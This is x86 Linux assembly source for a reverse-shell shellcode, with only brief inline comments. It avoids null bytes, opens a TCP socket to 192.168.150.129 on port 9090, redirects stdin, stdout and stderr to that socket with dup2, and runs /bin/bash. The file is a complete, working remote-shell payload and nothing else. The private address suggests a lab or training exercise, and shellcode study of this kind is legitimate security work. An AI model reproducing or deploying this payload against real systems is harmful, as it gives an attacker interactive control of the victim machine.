global _start
section .text
_start:

xor eax,eax        ;xors all registers to avoid having "\x00"
xor ebx,ebx
xor ecx ,ecx
xor edx,edx
;socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
push 0x66           ; socketcall 102 = 0x66
pop eax
push 1              ; socket call type (SYS_SOCKET)
pop ebx
push edi            ;IPPROTO_IP = 0
push 1              ;SOCK_STREAM
push 2              ;AF_INET
mov ecx , esp       ; pointer to above three args.
int 0x80
mov edi , eax       ; Saving the socket file descriptor in edi.

push BYTE 0x66 	; socketcall (syscall #102) 
pop eax
 inc ebx 		
 push DWORD 0x8196a8c0 	; IP address = 192.168.150.129
 push WORD 0x8223 	; PORT = 9090
 push bx 		; AF_INET = 2
 mov ecx, esp 		; store server struct pointer in ecx
 push BYTE 16 		; addrlen = 16
 push ecx 		; sockaddr *addr
 push edi 		; sockfd
 mov ecx, esp 		; ecx = argument array               ; ebx = 3 (sys_connect)
inc ebx
 int 0x80 	

mov ebx, edi 		; Put socket FD in ebx and 0x00000003 in eax.
xor eax,eax


mov al, 63         ; syscall dup2
mov ebx, edi        ; sockfd
xor ecx,ecx          ; stdin file descriptor.
int 0x80

mov al, 63
inc ecx             ; stdout file descriptor
int 0x80

mov al, 63
inc ecx             ; stderr file descriptor
int 0x80



mov al, 11           ; execve syscall
;args
push esi ; null
push 0x68736162       ; "bash"
push 0x2f2f2f2f       ; "////"
push 0x6e69622f       ; "/bin"
mov ebx, esp          ; pointer to "/bin////bash".
xor ecx,ecx            ; argv = null pointer
xor edx,edx            ; envp = null pointer
int 0x80
